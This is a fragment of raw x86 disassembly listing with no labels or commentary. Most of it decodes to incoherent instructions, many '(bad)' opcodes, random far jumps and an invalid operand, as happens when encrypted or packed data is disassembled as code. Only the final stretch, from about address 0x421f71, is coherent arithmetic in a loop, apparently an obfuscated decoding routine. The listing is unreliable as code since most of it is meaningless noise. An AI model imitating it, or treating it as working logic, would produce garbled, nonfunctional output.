  421856:	jmp    DWORD PTR [ecx+ebp*4+0x6a]
  42185a:	retf   
  42185b:	sub    dl,BYTE PTR [eax+ebp*8-0x67d5a2c]
  421862:	cwde   
  421863:	mov    dh,0x2
  421865:	or     DWORD PTR [ecx+0x73],ecx
  421868:	(bad)  
  421869:	cmp    DWORD PTR [eax],edx
  42186b:	jnp    0x42181b
  42186d:	mov    DWORD PTR [ebx-0x1789d890],ebx
  421873:	call   0xca23f05a
  421878:	cdq    
  421879:	or     al,0xc2
  42187b:	or     ah,BYTE PTR [ecx-0x52]
  42187e:	xor    ah,ch
  421880:	neg    DWORD PTR [eax]
  421882:	and    al,bh
  421884:	in     al,dx
  421885:	xchg   esp,eax
  421886:	adc    edi,0xa9b375ee
  42188c:	sub    eax,0x61f9c8e8
  421891:	bound  esp,QWORD PTR [edx+eax*1-0x4f4e9582]
  421898:	lahf   
  421899:	retf   
  42189a:	adc    bl,dl
  42189c:	add    BYTE PTR [edx-0xc],0xe1
  4218a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218a1:	and    ch,BYTE PTR [ebx+0x19]
  4218a4:	rcl    al,0xb0
  4218a7:	mov    eax,0xff291fe8
  4218ac:	sahf   
  4218ad:	repz fwait
  4218af:	pop    esi
  4218b0:	(bad)  
  4218b1:	je     0x4218de
  4218b3:	xchg   ebp,eax
  4218b4:	or     DWORD PTR [eax],0xe6355791
  4218ba:	lahf   
  4218bb:	mov    DWORD PTR [edx],esi
  4218bd:	jae    0x421861
  4218bf:	add    BYTE PTR [eax],dh
  4218c1:	jmp    0xd175:0xd800576d
  4218c8:	push   esp
  4218c9:	or     BYTE PTR [esp+eax*8],dh
  4218cc:	cmp    BYTE PTR [esi+ecx*2+0x1caf51d6],cl
  4218d3:	clc    
  4218d4:	mov    ah,BYTE PTR [ecx]
  4218d6:	xor    ebx,DWORD PTR [edx+eax*2+0x389f2612]
  4218dd:	pop    ss
  4218de:	sub    al,0xdb
  4218e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218e1:	enter  0xd922,0x20
  4218e5:	daa    
  4218e6:	dec    esi
  4218e7:	jecxz  0x4218f6
  4218e9:	les    eax,FWORD PTR [ecx+edi*8]
  4218ec:	mov    edx,DWORD PTR [ecx]
  4218ee:	dec    edx
  4218ef:	jecxz  0x4218e9
  4218f1:	xchg   edx,eax
  4218f2:	sub    al,0x68
  4218f4:	push   cs
  4218f5:	loop   0x42190e
  4218f7:	mov    BYTE PTR [ebx+edx*2-0x7f3b6553],ah
  4218fe:	in     al,dx
  4218ff:	aad    0x40
  421901:	and    BYTE PTR [ecx+0x6f],dh
  421904:	sbb    bh,BYTE PTR [esi+edx*4+0x3d]
  421908:	stc    
  421909:	adc    eax,0x2997c4ff
  42190e:	sbb    eax,0x816596f
  421913:	cmp    ah,BYTE PTR [edi-0x6f6d6abf]
  421919:	(bad)  
  42191b:	sahf   
  42191c:	inc    eax
  42191d:	and    al,0x83
  42191f:	inc    ebp
  421920:	adc    eax,0xf4c0fc82
  421925:	and    DWORD PTR [ebx+0x1a99dd41],esp
  42192b:	push   ebx
  42192c:	das    
  42192d:	add    bh,BYTE PTR [edx+edx*4]
  421930:	inc    esp
  421931:	mov    fs,edi
  421933:	fidiv  DWORD PTR [eax+0x56]
  421936:	or     DWORD PTR [edi-0x54a6a7ec],ebp
  42193c:	in     eax,0x5a
  42193e:	push   0x1f
  421940:	xchg   ebx,eax
  421941:	inc    ecx
  421942:	int    0xf5
  421944:	outs   dx,DWORD PTR ds:[esi]
  421945:	inc    edi
  421946:	adc    DWORD PTR [ebx+ebx*1],esi
  421949:	scas   eax,DWORD PTR es:[edi]
  42194a:	ror    BYTE PTR [ebp+0x0],1
  42194d:	enter  0x9585,0x3c
  421951:	xchg   ecx,eax
  421952:	hlt    
  421953:	jmp    edi
  421955:	lock inc edi
  421957:	mov    es,ebp
  421959:	jo     0x4218dd
  42195b:	lahf   
  42195c:	jno    0x42190a
  42195e:	xchg   BYTE PTR [ebp-0x7],al
  421961:	xor    BYTE PTR [ecx],ch
  421963:	repnz xchg edi,eax
  421965:	fcmovne st,st(2)
  421967:	xlat   BYTE PTR ds:[ebx]
  421968:	fdivrp st(4),st
  42196a:	scas   al,BYTE PTR es:[edi]
  42196b:	(bad)  
  42196c:	call   0x564190db
  421971:	(bad)  
  421972:	adc    eax,0x9074b7d6
  421977:	gs ss (bad) 
  42197a:	mov    ah,BYTE PTR [esi]
  42197c:	pop    edi
  42197d:	stos   DWORD PTR es:[edi],eax
  42197e:	xchg   BYTE PTR [edi+ebx*2-0x14c9caf1],cl
  421985:	mov    edi,0xf56d83a7
  42198a:	adc    eax,0xbb06c102
  42198f:	jg     0x4219fc
  421991:	adc    BYTE PTR [edi],0x52
  421994:	shl    DWORD PTR [esi-0x6ec01ffd],1
  42199a:	jmp    0x42195e
  42199c:	das    
  42199d:	pop    ebx
  42199e:	sub    al,0xff
  4219a0:	(bad)  
  4219a1:	jmp    0x4219a7
  4219a3:	cmp    BYTE PTR [edx],cl
  4219a5:	out    0xcb,eax
  4219a7:	nop
  4219a8:	inc    eax
  4219a9:	shl    cl,1
  4219ab:	jbe    0x4219b5
  4219ad:	mov    ds:0x33ef76fa,eax
  4219b2:	icebp  
  4219b3:	not    dh
  4219b5:	jmp    0xc27d:0xeaadff0a
  4219bc:	out    dx,al
  4219bd:	mov    bh,0x74
  4219bf:	in     eax,0x77
  4219c1:	hlt    
  4219c2:	ret    0xae27
  4219c5:	enter  0x2da9,0x6d
  4219c9:	rol    BYTE PTR [esi+0x2380a726],0x8d
  4219d0:	pop    esp
  4219d1:	outs   dx,DWORD PTR ds:[esi]
  4219d2:	je     0x4219aa
  4219d4:	mov    bl,0x80
  4219d6:	mov    al,0xec
  4219d8:	scas   eax,DWORD PTR es:[edi]
  4219d9:	cmp    BYTE PTR [ecx-0x7debaef2],0x6b
  4219e0:	mov    bh,0x30
  4219e2:	shr    BYTE PTR [ecx+0x1b],cl
  4219e5:	cmc    
  4219e6:	retf   0xf20a
  4219e9:	call   0x6d11bf1b
  4219ee:	test   eax,0xbb39552d
  4219f3:	mov    bl,0x61
  4219f5:	aas    
  4219f6:	mov    ds:0xa72eca40,eax
  4219fb:	mov    eax,ds:0x3ae4ebc1
  421a00:	cdq    
  421a01:	fcmovu st,st(2)
  421a03:	cmc    
  421a04:	pop    eax
  421a05:	xchg   edx,eax
  421a06:	ret    0x93a6
  421a09:	rcl    BYTE PTR [edx-0x66],0xb4
  421a0d:	jne    0x421a21
  421a0f:	int3   
  421a10:	pop    ds
  421a11:	and    dl,BYTE PTR [esi]
  421a13:	stc    
  421a14:	adc    DWORD PTR [ebx+0x3d223ca5],eax
  421a1a:	adc    BYTE PTR [esi-0x68],dl
  421a1d:	enter  0xd26a,0xd
  421a21:	mul    BYTE PTR [ebp-0x4c]
  421a24:	neg    bl
  421a26:	dec    edx
  421a27:	shr    BYTE PTR [esi+0x43f89235],1
  421a2d:	mov    bl,0xd8
  421a2f:	xor    BYTE PTR [ebx+ebp*4],al
  421a32:	and    ah,ah
  421a34:	movq   QWORD PTR [esi+0x14c7d651],mm1
  421a3b:	jne    0x421a0a
  421a3d:	loopne 0x421a01
  421a3f:	test   BYTE PTR [edx-0x1393ba2a],dh
  421a45:	in     al,0xb7
  421a47:	jle    0x4219f4
  421a49:	sbb    ch,bl
  421a4b:	call   0x2b91:0xebb7462a
  421a52:	and    BYTE PTR [eax+edx*2],cl
  421a55:	call   0xb29f:0x32679ae0
  421a5c:	pushf  
  421a5d:	jae    0x421abd
  421a5f:	pop    edi
  421a60:	push   esp
  421a61:	jo     0x421ab1
  421a63:	add    edi,DWORD PTR [edi+0x25249e6b]
  421a69:	add    dl,BYTE PTR [ebx]
  421a6b:	nop
  421a6c:	ins    DWORD PTR es:[edi],dx
  421a6d:	out    dx,al
  421a6e:	out    dx,eax
  421a6f:	in     al,0xdb
  421a71:	jp     0x421a93
  421a73:	fwait
  421a74:	cmc    
  421a75:	inc    edi
  421a76:	daa    
  421a77:	sub    ch,BYTE PTR [ebx+0x1c]
  421a7a:	add    BYTE PTR [esi+0x100719f],bl
  421a80:	sub    eax,DWORD PTR [esi-0x79]
  421a83:	(bad)  
  421a84:	jnp    0x421a89
  421a86:	loope  0x421a2f
  421a88:	sbb    eax,0xc93937c5
  421a8d:	ins    DWORD PTR es:[edi],dx
  421a8e:	out    0x70,eax
  421a90:	push   eax
  421a91:	jmp    0x5fb:0x1e2069b6
  421a98:	add    bl,bl
  421a9a:	rcl    ch,0xf7
  421a9d:	ds inc ebp
  421a9f:	inc    ebx
  421aa0:	std    
  421aa1:	lds    ebp,FWORD PTR ds:0xbb168060
  421aa7:	ins    BYTE PTR es:[edi],dx
  421aa8:	sbb    al,0xa5
  421aaa:	scas   eax,DWORD PTR es:[edi]
  421aab:	call   DWORD PTR [esi]
  421aad:	inc    ebp
  421aae:	rcr    BYTE PTR [ebp+0x6d343d5d],0x2e
  421ab5:	imul   edi,DWORD PTR [ecx-0x47],0x53a44ba6
  421abc:	(bad)  
  421abd:	nop
  421abe:	repnz arpl WORD PTR [ecx],bp
  421ac1:	xlat   BYTE PTR ds:[ebx]
  421ac2:	nop
  421ac3:	ret    
  421ac4:	xor    eax,0x8d0b3a83
  421ac9:	jb     0x421a7f
  421acb:	push   ecx
  421acc:	inc    eax
  421acd:	mov    dl,0xd0
  421acf:	mov    BYTE PTR [ecx+ecx*8],ch
  421ad2:	jb     0x421ab0
  421ad4:	gs pop edi
  421ad6:	mov    eax,0x417e2038
  421adb:	inc    ebp
  421adc:	inc    BYTE PTR [edx]
  421ade:	sahf   
  421adf:	push   ebp
  421ae0:	es jo  0x421aa1
  421ae3:	inc    eax
  421ae4:	(bad)  
  421ae5:	or     DWORD PTR [ecx],eax
  421ae7:	jge    0x421ad5
  421ae9:	add    al,0x65
  421aeb:	pop    esi
  421aec:	mov    edx,0xaa76a9eb
  421af1:	(bad)  
  421af2:	jp     0x421b6d
  421af4:	je     0x421afe
  421af6:	or     edi,DWORD PTR [ebp-0x5]
  421af9:	stos   BYTE PTR es:[edi],al
  421afa:	mov    ebx,0x2d5055c4
  421aff:	mov    ds:0x6e069a5f,al
  421b04:	int3   
  421b05:	jo     0x421b21
  421b07:	push   eax
  421b08:	dec    esp
  421b09:	mov    ebp,0x9d5d482b
  421b0e:	shl    DWORD PTR [esp+eiz*8],1
  421b11:	ficom  WORD PTR [ebx+esi*2]
  421b14:	cdq    
  421b15:	jb     0x421b51
  421b17:	mov    bh,cl
  421b19:	xchg   esp,eax
  421b1a:	mov    al,0x1e
  421b1c:	add    al,0x8a
  421b1e:	xor    BYTE PTR [edi+0x7],bh
  421b21:	test   al,0x53
  421b23:	inc    esi
  421b24:	imul   ecx,DWORD PTR [ebx+esi*2-0x7d70f54b],0x34959
  421b2f:	add    BYTE PTR [eax+0x6b],0x17
  421b33:	std    
  421b34:	daa    
  421b35:	popf   
  421b36:	xor    eax,0xd1c206b8
  421b3b:	inc    eax
  421b3c:	xchg   esp,eax
  421b3d:	fwait
  421b3e:	retf   0xab6a
  421b41:	fdivr  DWORD PTR [esi]
  421b43:	data16 scas al,BYTE PTR es:[edi]
  421b45:	inc    esp
  421b46:	ja     0xf82a5a72
  421b4c:	sti    
  421b4d:	(bad)  
  421b4e:	mov    ch,0xe9
  421b50:	jbe    0x421b13
  421b52:	adc    esi,edi
  421b54:	call   0x807b7ab8
  421b59:	(bad)  
  421b5b:	cmp    bh,BYTE PTR [esi]
  421b5d:	mov    al,0x43
  421b5f:	jbe    0x421b12
  421b61:	sub    al,0x37
  421b63:	push   0xffffffe6
  421b65:	jno    0x421bc9
  421b67:	mov    eax,ecx
  421b69:	mov    cl,0x5d
  421b6b:	in     al,dx
  421b6c:	jns    0x421b12
  421b6e:	ss jae 0x421b55
  421b71:	pop    es
  421b72:	(bad)  
  421b73:	cdq    
  421b74:	pop    ss
  421b75:	out    dx,eax
  421b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b77:	jo     0x421bb9
  421b79:	push   edi
  421b7a:	(bad)  
  421b7b:	out    0x61,al
  421b7d:	nop
  421b7e:	lods   al,BYTE PTR ds:[esi]
  421b7f:	add    bh,BYTE PTR [edi+0x31d28df2]
  421b85:	test   DWORD PTR [esi],ecx
  421b87:	aaa    
  421b88:	(bad)  
  421b89:	mov    esp,fs
  421b8b:	cdq    
  421b8c:	mov    al,0x46
  421b8e:	out    dx,al
  421b8f:	cdq    
  421b90:	rcr    bh,0x61
  421b93:	jo     0x421bac
  421b95:	mov    al,ds:0x3068b655
  421b9a:	lods   al,BYTE PTR ds:[esi]
  421b9b:	iret   
  421b9c:	cmp    DWORD PTR [ecx+0x53],edi
  421b9f:	xor    BYTE PTR [esi+0x63],bl
  421ba2:	scas   al,BYTE PTR es:[edi]
  421ba3:	(bad)  
  421ba4:	pusha  
  421ba5:	sub    eax,esi
  421ba7:	fs dec eax
  421ba9:	mov    dh,0x64
  421bab:	mov    bl,0xdb
  421bad:	mov    esp,0xe0835df0
  421bb2:	or     al,0x12
  421bb4:	mov    al,0x6b
  421bb6:	inc    esp
  421bb7:	je     0x421c00
  421bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bba:	xor    al,BYTE PTR [ebx-0x4f317c7d]
  421bc0:	mov    BYTE PTR [esi],dh
  421bc2:	ficom  DWORD PTR [esi-0x2e]
  421bc5:	adc    DWORD PTR [ebp+0x1fb48f93],eax
  421bcb:	mov    eax,0x5e66fb9e
  421bd0:	dec    ecx
  421bd1:	stos   DWORD PTR es:[edi],eax
  421bd2:	popa   
  421bd3:	dec    ebx
  421bd4:	mov    dh,0xf
  421bd6:	xlat   BYTE PTR ds:[ebx]
  421bd7:	js     0x421b8c
  421bd9:	sub    esi,DWORD PTR ds:0xc6c15cd9
  421bdf:	sub    BYTE PTR ds:0x8c234c6f,dl
  421be5:	test   al,0x16
  421be7:	xor    DWORD PTR [edi],0xc949e4e2
  421bed:	cli    
  421bee:	(bad)  
  421bef:	mov    eax,0x1c0850ef
  421bf4:	or     DWORD PTR [ecx-0x7a48d9e6],edi
  421bfa:	out    dx,eax
  421bfb:	les    ecx,FWORD PTR [eax+0x7a4b30e0]
  421c01:	push   0x91fda6e4
  421c06:	or     dh,ch
  421c08:	push   ebp
  421c09:	pcmpgtw mm2,QWORD PTR [eax-0x39]
  421c0d:	inc    esi
  421c0e:	jo     0x421c64
  421c10:	mov    esp,0x228a43a
  421c15:	xor    ecx,esp
  421c17:	push   edx
  421c18:	unpcklps xmm4,XMMWORD PTR [esi]
  421c1b:	fdivr  QWORD PTR [esi-0x22bb7be7]
  421c21:	xchg   ebx,eax
  421c22:	pop    edx
  421c23:	into   
  421c24:	ins    DWORD PTR es:[edi],dx
  421c25:	xor    ch,BYTE PTR [esi+edx*4-0x4c0f4552]
  421c2c:	and    ebp,DWORD PTR [ebp-0x4dc906fc]
  421c32:	mov    eax,ds:0x84e58dbe
  421c37:	mov    ecx,DWORD PTR [edx]
  421c39:	mov    ebp,0xf5ae2691
  421c3e:	nop
  421c3f:	sahf   
  421c40:	xlat   BYTE PTR ds:[ebx]
  421c41:	cwde   
  421c42:	jp     0x421c27
  421c44:	iret   
  421c45:	inc    eax
  421c46:	pop    edi
  421c47:	xchg   ebp,eax
  421c48:	inc    esi
  421c49:	cmp    bh,dl
  421c4b:	loop   0x421bf3
  421c4d:	pop    esi
  421c4e:	cwde   
  421c4f:	add    eax,0x66926003
  421c54:	dec    eax
  421c55:	pop    edx
  421c56:	sbb    BYTE PTR [eax],cl
  421c58:	xchg   BYTE PTR [ebx-0x4517b4d5],al
  421c5e:	add    bl,BYTE PTR [edi]
  421c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c61:	shr    DWORD PTR [edi+0x11c19383],cl
  421c67:	daa    
  421c68:	jmp    0x8a4e:0x39ad7378
  421c6f:	retf   0x8f60
  421c72:	ret    
  421c73:	fstp   TBYTE PTR [ecx]
  421c75:	sar    DWORD PTR [ecx+esi*2-0x5e13bbdf],0x6b
  421c7d:	cmp    bl,0xfb
  421c80:	ds jbe 0x421c25
  421c83:	mov    ?,WORD PTR es:[ecx]
  421c86:	and    ebx,DWORD PTR [esi]
  421c88:	jnp    0x421ccd
  421c8a:	in     al,dx
  421c8b:	jmp    0xa883:0x396d393d
  421c92:	stc    
  421c93:	jmp    0x421cff
  421c95:	adc    al,0xf5
  421c97:	out    dx,al
  421c98:	add    dh,BYTE PTR [ecx-0x6a]
  421c9b:	add    esi,DWORD PTR [ecx+0x51]
  421c9e:	sti    
  421c9f:	and    ah,BYTE PTR [ebx+0x61]
  421ca2:	pop    ds
  421ca3:	ffree  st(5)
  421ca5:	(bad)  
  421ca6:	scas   al,BYTE PTR es:[edi]
  421ca7:	dec    esi
  421ca8:	pop    ss
  421ca9:	clc    
  421caa:	in     al,0xb8
  421cac:	scas   al,BYTE PTR es:[edi]
  421cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cae:	(bad)  
  421cb0:	push   eax
  421cb1:	sbb    edx,esi
  421cb3:	xchg   ebp,eax
  421cb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cb5:	mov    ds:0xc689ba9c,eax
  421cba:	jae    0x421cb0
  421cbc:	inc    edx
  421cbd:	sbb    ecx,DWORD PTR [edi]
  421cbf:	inc    ebp
  421cc0:	sahf   
  421cc1:	push   ss
  421cc2:	or     ebx,DWORD PTR [edx+ecx*8+0x7d]
  421cc6:	add    dh,BYTE PTR [ecx+edi*1+0x25]
  421cca:	jmp    0x421c81
  421ccc:	cmp    ah,BYTE PTR [esi]
  421cce:	add    edi,DWORD PTR [ebp+0x13]
  421cd1:	std    
  421cd2:	inc    ecx
  421cd3:	mov    dl,0x71
  421cd5:	push   ecx
  421cd6:	cmp    edi,DWORD PTR [esi+edx*2-0x57ba6076]
  421cdd:	fist   DWORD PTR [eax-0x7a12036d]
  421ce3:	out    dx,eax
  421ce4:	inc    esi
  421ce5:	jne    0x421c87
  421ce7:	push   esi
  421ce8:	xlat   BYTE PTR ds:[ebx]
  421ce9:	jge    0x421cbf
  421ceb:	adc    cl,BYTE PTR [esi-0x4d0b94d6]
  421cf1:	loope  0x421cc4
  421cf3:	lea    edx,[esi-0x75]
  421cf6:	mov    eax,0xfdee4067
  421cfb:	xchg   ecx,eax
  421cfc:	cwde   
  421cfd:	call   0x2e8b2717
  421d02:	pop    ss
  421d03:	test   BYTE PTR [ebp-0x40],ah
  421d06:	imul   eax,DWORD PTR [edx+0x1551e62d],0xb9b42a79
  421d10:	mov    ds:0xddaa959,eax
  421d15:	and    DWORD PTR [ebx-0x21],edx
  421d18:	pop    ebx
  421d1a:	ja     0x421d0f
  421d1c:	adc    ecx,DWORD PTR [eax]
  421d1e:	mov    edi,0x12156067
  421d23:	add    DWORD PTR [ebp+0x42],esp
  421d26:	aaa    
  421d27:	jp     0x421cda
  421d29:	std    
  421d2a:	or     eax,0xc21c4a73
  421d2f:	xor    BYTE PTR [esi+0x50],0xc5
  421d33:	packsswb mm6,mm5
  421d36:	in     eax,dx
  421d37:	add    eax,0x8ffe4c5b
  421d3c:	rcl    DWORD PTR [edi+0x24],1
  421d3f:	add    dh,bh
  421d41:	(bad)  [edx-0x6ca0c51b]
  421d47:	xchg   edx,eax
  421d48:	cmp    esi,esi
  421d4a:	in     al,0x9
  421d4c:	dec    edi
  421d4d:	xor    ecx,ecx
  421d4f:	jge    0x421d54
  421d51:	iret   
  421d52:	sub    ebx,ecx
  421d54:	popf   
  421d55:	in     al,dx
  421d56:	inc    esi
  421d57:	cdq    
  421d58:	mov    esi,0x7b6c6f7d
  421d5d:	out    0xb1,eax
  421d5f:	pop    ebx
  421d60:	push   edx
  421d61:	sbb    dh,ch
  421d63:	neg    BYTE PTR [ebp+edi*8-0x3ee0fd9b]
  421d6a:	or     al,0xc1
  421d6c:	pushf  
  421d6d:	repnz shl DWORD PTR [edx],1
  421d70:	or     eax,DWORD PTR [esi]
  421d72:	cwde   
  421d73:	add    DWORD PTR [ecx],esp
  421d75:	xchg   edi,eax
  421d76:	mov    edx,0x88491df3
  421d7b:	sub    eax,0x7088335d
  421d80:	mov    gs,WORD PTR [eax]
  421d82:	push   eax
  421d83:	mov    dh,0x3b
  421d85:	add    dh,dl
  421d87:	push   0x393560f8
  421d8c:	mov    dh,0xce
  421d8e:	out    0xa7,eax
  421d90:	pop    ds
  421d91:	push   0x21837384
  421d96:	cmp    edx,DWORD PTR [ebp-0x52]
  421d99:	lahf   
  421d9a:	cs xchg edi,eax
  421d9c:	jnp    0x421d91
  421d9e:	rol    DWORD PTR [esi],cl
  421da0:	sub    esi,ecx
  421da2:	mov    dl,0x2d
  421da4:	and    dl,BYTE PTR [ecx-0x67]
  421da7:	inc    esi
  421da8:	mov    eax,ds:0xbeb854fd
  421dad:	mov    ds:0x253bcc03,al
  421db2:	neg    dl
  421db4:	sti    
  421db5:	mov    eax,ds:0x69a1711b
  421dba:	sub    BYTE PTR [ecx+0x50],bh
  421dbd:	out    0xab,eax
  421dbf:	mov    bh,0x17
  421dc1:	cmc    
  421dc2:	not    ebx
  421dc4:	jno    0x421dfd
  421dc6:	loopne 0x421e13
  421dc8:	mov    ebx,0xc62fc106
  421dcd:	xchg   DWORD PTR [edx+0x22],ebp
  421dd0:	add    al,0xd3
  421dd2:	int    0xc7
  421dd4:	or     bl,BYTE PTR [ebp+ebp*2+0x182d9356]
  421ddb:	add    al,0x59
  421ddd:	fdiv   QWORD PTR [eax+ebx*1+0x5c]
  421de1:	scas   al,BYTE PTR es:[edi]
  421de2:	push   edx
  421de3:	aas    
  421de4:	dec    esi
  421de5:	mov    dl,0xd8
  421de7:	sbb    ebp,DWORD PTR [esi-0x4d]
  421dea:	fdiv   QWORD PTR [ebx]
  421dec:	push   bx
  421dee:	ja     0x421da2
  421df0:	(bad)  
  421df1:	outs   dx,DWORD PTR ds:[esi]
  421df2:	imul   ebx,DWORD PTR [esi+0x3f6c8326],0x15
  421df9:	push   esi
  421dfa:	adc    bh,0x3a
  421dfd:	xlat   BYTE PTR ds:[ebx]
  421dfe:	cmp    edi,DWORD PTR [ebp+0x34]
  421e01:	dec    esi
  421e02:	dec    esp
  421e03:	dec    esi
  421e04:	aas    
  421e05:	stc    
  421e06:	test   eax,0x80caf955
  421e0b:	jno    0x421db0
  421e0d:	jns    0x421ded
  421e0f:	xlat   BYTE PTR ds:[ebx]
  421e10:	inc    ecx
  421e11:	(bad)  
  421e12:	mov    ecx,0x69d85d07
  421e17:	push   ss
  421e18:	cmp    al,0x18
  421e1a:	inc    edx
  421e1b:	or     BYTE PTR [esi-0x3265003d],ch
  421e21:	pop    es
  421e22:	imul   ebp,DWORD PTR [edx-0x38b42031],0xffffff95
  421e29:	jge    0x421e9d
  421e2b:	push   0xb7197368
  421e30:	add    DWORD PTR [edi],0xffffffd1
  421e33:	mov    ebp,0xd77f23ac
  421e38:	lea    edi,[edx-0xb]
  421e3b:	pop    es
  421e3c:	in     eax,0xfb
  421e3e:	std    
  421e3f:	cmp    al,0xf4
  421e41:	mov    BYTE PTR [esi-0x3052fbc8],ch
  421e47:	mov    edx,0xd7ee70b
  421e4c:	or     edi,DWORD PTR [edx+0x1]
  421e4f:	jle    0x421ece
  421e51:	lea    ebx,[ecx]
  421e53:	test   BYTE PTR [esi+0x673cfa1c],0xd0
  421e5a:	test   DWORD PTR [edi-0x4f],eax
  421e5d:	inc    ebp
  421e5e:	inc    eax
  421e5f:	adc    ebp,edi
  421e61:	xchg   BYTE PTR [esp+eiz*4-0x3c],bh
  421e65:	shl    DWORD PTR [ebx-0x6f],cl
  421e68:	in     eax,0xee
  421e6a:	mov    edi,0x6a885132
  421e6f:	dec    esp
  421e70:	xor    ebp,esp
  421e72:	xchg   ecx,eax
  421e73:	xchg   esp,eax
  421e74:	pop    ss
  421e75:	hlt    
  421e76:	repnz fwait
  421e78:	pop    ebp
  421e79:	adc    DWORD PTR [eax+0x2b0e8184],edx
  421e7f:	fnstenv [edx-0x80]
  421e82:	jp     0x421e7f
  421e84:	aas    
  421e85:	mov    eax,ds:0x324ee2b8
  421e8a:	dec    ebx
  421e8b:	(bad)
  421e8f:	and    BYTE PTR [esi],ah
  421e91:	imul   ebx,DWORD PTR [esi+0x457e2935],0x339b07e6
  421e9b:	xchg   esp,eax
  421e9c:	jb     0x421e79
  421e9e:	frstor [eax+0x12892a69]
  421ea4:	xor    BYTE PTR [eax-0xd],ch
  421ea7:	mov    dl,0xcd
  421ea9:	jo     0x421e98
  421eab:	pop    es
  421eac:	or     ebp,esp
  421eae:	mov    esp,0xa09684fe
  421eb3:	inc    edi
  421eb4:	clc    
  421eb5:	or     ebx,DWORD PTR [esi+0x4ebc519c]
  421ebb:	mov    cl,0x73
  421ebd:	bound  ebp,QWORD PTR [esi+esi*1-0x79]
  421ec1:	cmp    edi,DWORD PTR [edi+edx*2]
  421ec4:	add    al,0xf3
  421ec6:	imul   ebx,DWORD PTR [esi-0x4a],0xff111757
  421ecd:	dec    esi
  421ece:	pop    ds
  421ecf:	lds    eax,FWORD PTR [esi-0x34]
  421ed2:	test   BYTE PTR [ebp+ecx*8-0x4e],cl
  421ed6:	push   0xbaa10f55
  421edb:	cwde   
  421edc:	add    DWORD PTR [esi-0x33276ea],esp
  421ee2:	cmp    bl,cl
  421ee4:	adc    DWORD PTR [eax],edx
  421ee6:	aam    0xd3
  421ee8:	cli    
  421ee9:	outs   dx,BYTE PTR ds:[esi]
  421eea:	test   al,0x8e
  421eec:	imul   esp,esp,0x983cee88
  421ef2:	push   0xf7c15c4e
  421ef7:	jns    0x421e8a
  421ef9:	push   ds
  421efa:	xor    BYTE PTR ds:0x52dcb2c5,0x29
  421f01:	push   ebp
  421f02:	inc    esp
  421f03:	mov    bl,BYTE PTR [esi-0x76ad75ac]
  421f09:	rcr    DWORD PTR [edx],1
  421f0b:	cdq    
  421f0c:	mov    ch,0x2f
  421f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f0f:	pop    esp
  421f10:	retf   
  421f11:	push   edx
  421f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f13:	fcom   QWORD PTR [ecx]
  421f15:	inc    esi
  421f16:	xor    al,0xab
  421f18:	in     eax,dx
  421f19:	dec    edi
  421f1a:	fcmovnbe st,st(2)
  421f1c:	or     eax,0x49249370
  421f21:	xor    eax,0x605f315d
  421f26:	sbb    edi,DWORD PTR [edx+0x787dd931]
  421f2c:	lods   eax,DWORD PTR ds:[esi]
  421f2d:	daa    
  421f2e:	ins    DWORD PTR es:[edi],dx
  421f2f:	cmp    DWORD PTR [edx-0x465bdd6e],ebx
  421f35:	call   0xb175:0x395997db
  421f3c:	aam    0xaa
  421f3e:	dec    eax
  421f3f:	(bad)  
  421f40:	out    0x7c,al
  421f42:	jo     0x421f8e
  421f44:	mov    al,0x84
  421f46:	stos   DWORD PTR es:[edi],eax
  421f47:	or     eax,DWORD PTR [edx+0x5a7e6eb8]
  421f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f4e:	shr    cl,cl
  421f50:	nop
  421f51:	pop    ds
  421f52:	push   0x3
  421f54:	rcl    DWORD PTR [edx+0x694dfef8],1
  421f5a:	sub    eax,0xef9f978d
  421f5f:	(bad)  
  421f60:	fsub   QWORD PTR [esp+edx*2+0x15]
  421f64:	rol    ecx,1
  421f66:	add    al,BYTE PTR [ebp-0x44835177]
  421f6c:	or     BYTE PTR [esi-0x76],ch
  421f6f:	jge    0x421fbb
  421f71:	mov    edi,esp
  421f73:	mov    ecx,DWORD PTR gs:[ebp+0x8]
  421f77:	mov    edx,DWORD PTR [ebp-0x8]
  421f7a:	xor    ecx,eax
  421f7c:	xor    edx,eax
  421f7e:	sub    ecx,edx
  421f80:	sub    ecx,esi
  421f82:	xor    ecx,eax
  421f84:	mov    DWORD PTR [ebp+0x8],ecx
  421f87:	mov    ecx,DWORD PTR [ebp+0x8]
  421f8a:	mov    edx,DWORD PTR [ebp-0x58]
  421f8d:	add    ecx,0x5708fa
  421f93:	imul   ecx,edx
  421f96:	mov    DWORD PTR [ebp-0x58],ecx
  421f99:	mov    ecx,DWORD PTR [ebp+0x8]
  421f9c:	mov    edx,DWORD PTR [ebp-0x54]
  421f9f:	add    ecx,0x64f898
  421fa5:	or     ecx,edx
  421fa7:	mov    DWORD PTR [ebp-0x54],ecx
  421faa:	mov    ecx,DWORD PTR [ebp+0x8]
  421fad:	mov    edx,DWORD PTR [ebp-0x50]
  421fb0:	add    ecx,0x242ebc9
  421fb6:	xor    ecx,edx
  421fb8:	mov    DWORD PTR [ebp-0x50],ecx
  421fbb:	mov    ecx,DWORD PTR [ebp+0x8]
  421fbe:	mov    edx,DWORD PTR [ebp-0x4c]
  421fc1:	add    ecx,edi
  421fc3:	and    ecx,edx
  421fc5:	mov    DWORD PTR [ebp-0x4c],ecx
  421fc8:	mov    ecx,DWORD PTR [ebp+0x8]
  421fcb:	mov    edx,DWORD PTR [ebp-0x48]
  421fce:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421fd5:	mov    DWORD PTR [ebp-0x48],ecx
  421fd8:	mov    ecx,DWORD PTR [ebp+0x8]
  421fdb:	mov    edx,0xfa5e1524
  421fe0:	sub    edx,ecx
  421fe2:	add    edx,DWORD PTR [ebp-0x44]
  421fe5:	mov    DWORD PTR [ebp-0x44],edx
  421fe8:	mov    ecx,DWORD PTR [ebp+0x8]
  421feb:	xor    ecx,eax
  421fed:	add    ecx,esi
  421fef:	jne    0x421f74
